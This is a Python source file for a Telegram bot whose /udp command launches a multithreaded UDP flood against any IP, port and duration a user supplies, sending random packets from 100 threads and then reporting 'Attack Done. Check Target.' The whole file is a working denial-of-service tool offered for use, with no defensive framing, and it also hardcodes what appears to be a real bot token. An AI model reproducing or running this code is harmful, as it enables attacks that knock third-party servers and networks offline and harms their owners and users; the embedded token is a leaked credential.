import socket
import time
import sys
import asyncio
import random
import threading
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

BOT_TOKEN = "7744875151:AAF8P1vSd8awHrmaGmWQiI6d-S_fgoPvLkY"

# Start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👋 Welcome Pawan Bhai! Use /udp <ip> <port> <duration>")

# Powerful UDP Attack Function (Multithreaded, Random Payloads)
def send_flood(ip, port, duration):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < timeout:
        try:
            # Random bytes instead of fixed 'X'
            data = random._urandom(1024)
            sock.sendto(data, (ip, port))
        except Exception as e:
            break
    sock.close()

# Multi-threading wrapper
def start_attack(ip, port, duration, threads=100):
    print(f"[+] Starting Powerful UDP Flood on {ip}:{port} for {duration} seconds using {threads} threads...")
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=send_flood, args=(ip, port, duration))
        t.start()
        thread_list.append(t)
    for t in thread_list:
        t.join()
    print("[✓] Attack finished.")

# UDP command handler
async def udp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 3:
        await update.message.reply_text("❌ Usage: /udp <ip> <port> <duration>")
        return

    ip = context.args[0]
    port = int(context.args[1])
    duration = int(context.args[2])

    await update.message.reply_text(f"🚀 Attacking {ip}:{port} for {duration} seconds with 🔥Power🔥")

    loop = asyncio.get_event_loop()
    await loop.run_in_executor(None, start_attack, ip, port, duration)

    await update.message.reply_text("✅ Attack Done. Check Target.")

# Run bot
if __name__ == "__main__":
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("udp", udp))
    app.run_polling()
  
